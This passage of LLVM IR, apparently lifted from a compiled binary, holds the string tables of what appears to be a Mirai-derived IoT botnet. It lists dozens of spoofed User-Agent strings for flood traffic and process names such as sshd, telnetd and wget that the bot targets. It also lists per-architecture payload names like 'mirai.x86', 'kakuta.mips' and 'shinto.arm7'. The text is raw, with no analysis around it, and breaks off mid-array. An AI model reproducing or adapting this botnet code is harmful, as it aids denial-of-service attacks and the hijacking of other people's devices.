@global_var_1c1c8.641 = constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 8743.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.101 Safari/537.36\00"
@global_var_1c23c.642 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_1c2b0.643 = constant [117 x i8] c"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393\00"
@global_var_1c328.644 = constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36\00"
@global_var_1c39c.645 = constant [79 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\00"
@global_var_1c3ec.646 = constant [121 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36\00"
@global_var_1c468.647 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\00"
@global_var_1c4dc.648 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.1.2883.83 Secure/55.1.2883.373 Saf\00"
@global_var_1c558.649 = constant [137 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; LGLS665 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36\00"
@global_var_1c5e4.650 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_1c630.651 = constant [267 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-N910A Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 Instagram 10.5.1 Android (22/5.1.1; 640dpi; 1440x2560; samsung; SAMSUNG-SM-N910A; trlteatt; qcom; en_US)\00"
@global_var_1c73c.652 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1c77c.653 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1c7bc.654 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1c84c.655 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1c884.656 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1c8a4.657 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1c8bc.658 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1c914.659 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_1c9b4.660 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_1ca08.661 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_1ca7c.662 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_1cabc.663 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_1cb74.664 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_1cbc8.665 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_1cc20.666 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_1cc78.667 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_1ccb8.668 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_1cd00.669 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_1cd58.670 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_1cdc4.671 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_1ce1c.672 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_1ce6c.673 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_1ce90.674 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_1ceec.675 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_1cefc.676 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_1cf2c.677 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_1cf50.678 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_1cf74.679 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_1cf90.680 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1cfd0.681 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1d05c.682 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1d0a4.683 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1d0ec.684 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1d134.685 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1d17c.686 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_1d1d0.687 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_1d220.688 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_1d28c.689 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_1d2e0.690 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_1d33c.691 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_1d398.692 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_1d3fc.693 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_1d458.694 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1d4b4.695 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1d510.696 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1d570.697 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_1d5b8.698 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_1d650.699 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_1d69c.700 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1d6e8.701 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_1d738.702 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_1d780.703 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_1d7d4.704 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_1d824.705 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_1d86c.706 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_1d8b8.707 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1d904.708 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_1d94c.709 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1d99c.710 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1d9ec.711 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1da20.712 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1da54.713 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_1da9c.714 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1daa8.715 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1dab4.716 = constant [6 x i8] c"jhUOH\00"
@global_var_1dabc.717 = constant [8 x i8] c"RYrydry\00"
@global_var_1dac4.718 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1dad0.719 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1dadc.720 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1dae8.721 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1daf4.722 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1dafc.723 = constant [9 x i8] c"FTUdftui\00"
@global_var_1db08.724 = constant [4 x i8] c"[M]\00"
@global_var_1db0c.725 = constant [5 x i8] c"[MS]\00"
@global_var_1db14.726 = constant [5 x i8] c"[SH]\00"
@global_var_1db1c.727 = constant [6 x i8] c"[x86]\00"
@global_var_1db24.728 = constant [5 x i8] c"[A6]\00"
@global_var_1db2c.729 = constant [5 x i8] c"[I6]\00"
@global_var_1db34.730 = constant [6 x i8] c"[PPC]\00"
@global_var_1db3c.731 = constant [5 x i8] c"[I5]\00"
@global_var_1db44.732 = constant [6 x i8] c"[M68]\00"
@global_var_1db4c.733 = constant [4 x i8] c"[S]\00"
@global_var_1db50.734 = constant [5 x i8] c"[A4]\00"
@global_var_1db58.735 = constant [5 x i8] c"[A5]\00"
@global_var_1db60.736 = constant [10 x i8] c"[PPC-440]\00"
@global_var_1db6c.737 = constant [8 x i8] c"[A4-EB]\00"
@global_var_1db74.738 = constant [8 x i8] c"[A4-TL]\00"
@global_var_1db7c.739 = constant [5 x i8] c"[I4]\00"
@global_var_1db84.740 = constant [6 x i8] c"[M64]\00"
@global_var_1db8c.741 = constant [5 x i8] c"ntpd\00"
@global_var_1db94.742 = constant [5 x i8] c"sshd\00"
@global_var_1db9c.743 = constant [8 x i8] c"openssh\00"
@global_var_1dba4.744 = constant [5 x i8] c"bash\00"
@global_var_1dbac.745 = constant [5 x i8] c"tftp\00"
@global_var_1dbb4.746 = constant [5 x i8] c"wget\00"
@global_var_1dbbc.747 = constant [5 x i8] c"cron\00"
@global_var_1dbc4.748 = constant [4 x i8] c"ftp\00"
@global_var_1dbc8.749 = constant [5 x i8] c"pftp\00"
@global_var_1dbd4.750 = constant [6 x i8] c"[cpu]\00"
@global_var_1dbdc.751 = constant [8 x i8] c"apache2\00"
@global_var_1dbe4.752 = constant [8 x i8] c"telnetd\00"
@global_var_1dbec.753 = constant [5 x i8] c"mips\00"
@global_var_1dbf4.754 = constant [7 x i8] c"mipsel\00"
@global_var_1dbfc.755 = constant [4 x i8] c"sh4\00"
@global_var_1dc00.756 = constant [4 x i8] c"x86\00"
@global_var_1dc04.757 = constant [5 x i8] c"i686\00"
@global_var_1dc0c.758 = constant [5 x i8] c"i586\00"
@global_var_1dc14.759 = constant [4 x i8] c"ppc\00"
@global_var_1dc18.760 = constant [5 x i8] c"m68k\00"
@global_var_1dc20.761 = constant [11 x i8] c"jackmymips\00"
@global_var_1dc2c.762 = constant [13 x i8] c"jackmymips64\00"
@global_var_1dc3c.763 = constant [13 x i8] c"jackmymipsel\00"
@global_var_1dc4c.764 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_1dc58.765 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_1dc68.766 = constant [10 x i8] c"jackmysh4\00"
@global_var_1dc74.767 = constant [10 x i8] c"jackmyx86\00"
@global_var_1dc80.768 = constant [11 x i8] c"jackmyi486\00"
@global_var_1dc8c.769 = constant [11 x i8] c"jackmyi586\00"
@global_var_1dc98.770 = constant [11 x i8] c"jackmyi686\00"
@global_var_1dca4.771 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_1dcb4.772 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_1dcc8.773 = constant [11 x i8] c"jackmym68k\00"
@global_var_1dcd4.774 = constant [12 x i8] c"jackmysparc\00"
@global_var_1dce0.775 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_1dcec.776 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_1dcfc.777 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_1dd08.778 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_1dd14.779 = constant [7 x i8] c"x86_64\00"
@global_var_1dd1c.780 = constant [7 x i8] c"armv6l\00"
@global_var_1dd24.781 = constant [8 x i8] c"powerpc\00"
@global_var_1dd2c.782 = constant [6 x i8] c"sparc\00"
@global_var_1dd34.783 = constant [7 x i8] c"armv4l\00"
@global_var_1dd3c.784 = constant [7 x i8] c"armv5l\00"
@global_var_1dd44.785 = constant [14 x i8] c"powerpc-440fp\00"
@global_var_1dd54.786 = constant [8 x i8] c"botmips\00"
@global_var_1dd5c.787 = constant [10 x i8] c"botmipsel\00"
@global_var_1dd68.788 = constant [7 x i8] c"botsh4\00"
@global_var_1dd70.789 = constant [10 x i8] c"botx86_64\00"
@global_var_1dd7c.790 = constant [10 x i8] c"botarmv6l\00"
@global_var_1dd88.791 = constant [8 x i8] c"boti686\00"
@global_var_1dd90.792 = constant [11 x i8] c"botpowerpc\00"
@global_var_1dd9c.793 = constant [8 x i8] c"boti586\00"
@global_var_1dda4.794 = constant [8 x i8] c"botm68k\00"
@global_var_1ddac.795 = constant [9 x i8] c"botsparc\00"
@global_var_1ddb8.796 = constant [10 x i8] c"botarmv4l\00"
@global_var_1ddc4.797 = constant [10 x i8] c"botarmv5l\00"
@global_var_1ddd0.798 = constant [16 x i8] c"botpowerpc440fp\00"
@global_var_1dde0.799 = constant [9 x i8] c"iluvmips\00"
@global_var_1ddec.800 = constant [11 x i8] c"dannytyzoh\00"
@global_var_1ddf8.801 = constant [10 x i8] c"igisamzin\00"
@global_var_1de04.802 = constant [15 x i8] c"Ihaveablackpup\00"
@global_var_1de14.803 = constant [10 x i8] c"Armv4lkek\00"
@global_var_1de20.804 = constant [10 x i8] c"Armv5lkek\00"
@global_var_1de2c.805 = constant [10 x i8] c"Armv6lkek\00"
@global_var_1de38.806 = constant [8 x i8] c"i686kek\00"
@global_var_1de40.807 = constant [7 x i8] c"ppckek\00"
@global_var_1de48.808 = constant [11 x i8] c"motorcycle\00"
@global_var_1de54.809 = constant [7 x i8] c"m68kek\00"
@global_var_1de5c.810 = constant [9 x i8] c"sparckek\00"
@global_var_1de68.811 = constant [11 x i8] c"ponydicks1\00"
@global_var_1de74.812 = constant [11 x i8] c"ponydicks2\00"
@global_var_1de80.813 = constant [11 x i8] c"ponydicks3\00"
@global_var_1de8c.814 = constant [11 x i8] c"ponydicks4\00"
@global_var_1de98.815 = constant [11 x i8] c"ponydicks5\00"
@global_var_1dea4.816 = constant [11 x i8] c"ponydicks6\00"
@global_var_1deb0.817 = constant [11 x i8] c"ponydicks7\00"
@global_var_1debc.818 = constant [11 x i8] c"ponydicks8\00"
@global_var_1dec8.819 = constant [11 x i8] c"ponydicks9\00"
@global_var_1ded4.820 = constant [12 x i8] c"ponydicks10\00"
@global_var_1dee0.821 = constant [12 x i8] c"ponydicks11\00"
@global_var_1deec.822 = constant [12 x i8] c"kakuta.mips\00"
@global_var_1def8.823 = constant [12 x i8] c"kakuta.mpsl\00"
@global_var_1df04.824 = constant [11 x i8] c"kakuta.sh4\00"
@global_var_1df10.825 = constant [11 x i8] c"kakuta.x86\00"
@global_var_1df1c.826 = constant [12 x i8] c"kakuta.arm4\00"
@global_var_1df28.827 = constant [12 x i8] c"kakuta.arm5\00"
@global_var_1df34.828 = constant [12 x i8] c"kakuta.arm6\00"
@global_var_1df40.829 = constant [12 x i8] c"kakuta.i686\00"
@global_var_1df4c.830 = constant [11 x i8] c"kakuta.ppc\00"
@global_var_1df58.831 = constant [12 x i8] c"kakuta.i586\00"
@global_var_1df64.832 = constant [12 x i8] c"kakuta.m68k\00"
@global_var_1df70.833 = constant [13 x i8] c"kakuta.sparc\00"
@global_var_1df80.834 = constant [11 x i8] c"shinto.x86\00"
@global_var_1df8c.835 = constant [12 x i8] c"shinto.mips\00"
@global_var_1df98.836 = constant [12 x i8] c"shinto.mpsl\00"
@global_var_1dfa4.837 = constant [12 x i8] c"shinto.arm4\00"
@global_var_1dfb0.838 = constant [12 x i8] c"shinto.arm5\00"
@global_var_1dfbc.839 = constant [12 x i8] c"shinto.arm6\00"
@global_var_1dfc8.840 = constant [12 x i8] c"shinto.arm7\00"
@global_var_1dfd4.841 = constant [11 x i8] c"shinto.ppc\00"
@global_var_1dfe0.842 = constant [11 x i8] c"shinto.spc\00"
@global_var_1dfec.843 = constant [12 x i8] c"shinto.m68k\00"
@global_var_1dff8.844 = constant [11 x i8] c"shinto.sh4\00"
@global_var_1e004.845 = constant [12 x i8] c"shintoo.x86\00"
@global_var_1e010.846 = constant [13 x i8] c"shintoo.mips\00"
@global_var_1e020.847 = constant [13 x i8] c"shintoo.mpsl\00"
@global_var_1e030.848 = constant [12 x i8] c"shintoo.arm\00"
@global_var_1e03c.849 = constant [13 x i8] c"shintoo.arm5\00"
@global_var_1e04c.850 = constant [13 x i8] c"shintoo.arm6\00"
@global_var_1e05c.851 = constant [13 x i8] c"shintoo.arm7\00"
@global_var_1e06c.852 = constant [12 x i8] c"shintoo.ppc\00"
@global_var_1e078.853 = constant [24 x i8] c"shintoo.spcshintoo.m68k\00"
@global_var_1e090.854 = constant [12 x i8] c"shintoo.sh4\00"
@global_var_1e09c.855 = constant [10 x i8] c"mirai.x86\00"
@global_var_1e0a8.856 = constant [12 x i8] c"miraint.x86\00"
@global_var_1e0b4.857 = constant [11 x i8] c"mirai.mips\00"
@global_var_1e0c0.858 = constant [13 x i8] c"miraint.mips\00"
@global_var_1e0d0.859 = constant [11 x i8] c"mirai.mpsl\00"
@global_var_1e0dc.860 = constant [13 x i8] c"miraint.mpsl\00"
@global_var_1e0ec.861 = constant [10 x i8] c"mirai.arm\00"
@global_var_1e0f8.862 = constant [12 x i8] c"miraint.arm\00"
@global_var_1e104.863 = constant [12 x i8] c"mirai.arm5n\00"
@global_var_1e110.864 = constant [14 x i8] c"miraint.arm5n\00"
@global_var_1e120.865 = constant [11 x i8] c"mirai.arm7\00"
@global_var_1e12c.866 = constant [13 x i8] c"miraint.arm7\00"
@global_var_1e13c.867 = constant [10 x i8] c"mirai.ppc\00"
@global_var_1e148.868 = constant [12 x i8] c"miraint.ppc\00"
@global_var_1e154.869 = constant [10 x i8] c"mirai.spc\00"
@global_var_1e160.870 = constant [12 x i8] c"miraint.spc\00"
@global_var_1e16c.871 = constant [11 x i8] c"mirai.m68k\00"
@global_var_1e178.872 = constant [13 x i8] c"miraint.m68k\00"
@global_var_1e188.873 = constant [10 x i8] c"mirai.sh4\00"
@global_var_1e194.874 = constant [12 x i8] c"miraint.sh4\00"
@global_var_290e4.875 = global [295 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b3e0.594, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b3e8.595, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b3e8.595, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b3f0.596, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b3f0.596, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b3f8.597, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1b400.598, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b40c.599, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b3f0.596, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b3e8.595, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1b414.600, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b3e8.595, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b3e8.595, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b420.601, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b3e0.594, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b3e8.595, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b428.602, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b3f0.596, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b430.603, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b3f8.597, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1b400.598, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b40c.599, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1b43c.604, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1b448.605, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b450.606, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1b43c.604, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1b45c.607, i32 0, i32 0), i8* bitcast (i32* @global_var_1b46c.608 to i8*), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1b470.609, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1b4e4.610, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_1b554.611, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_1b5c8.612, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1b63c.613, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1b6b8.614, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1b728.615, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_1b7a4.616, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @global_var_1b818.617, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1b880.618, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1b8fc.619, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @global_var_1b948.620, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1b9c4.621, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_1ba34.622, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_1baa8.623, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1bad8.624, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1bb54.625, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1bbc4.626, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1bc0c.627, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1bc88.628, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1bd04.629, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_1bd80.630, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_1bdcc.631, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @global_var_1be38.632, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1be88.633, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1bf04.634, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1bf80.635, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1bfcc.636, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1c048.637, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1c0c4.638, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @global_var_1c140.639, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @global_var_1c184.640, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1c1c8.641, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1c23c.642, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_1c2b0.643, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1c328.644, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_1c39c.645, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1c3ec.646, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1c468.647, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1c4dc.648, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @global_var_1c558.649, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1c5e4.650, i32 0, i32 0), i8* getelementptr inbounds ([267 x i8], [267 x i8]* @global_var_1c630.651, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* 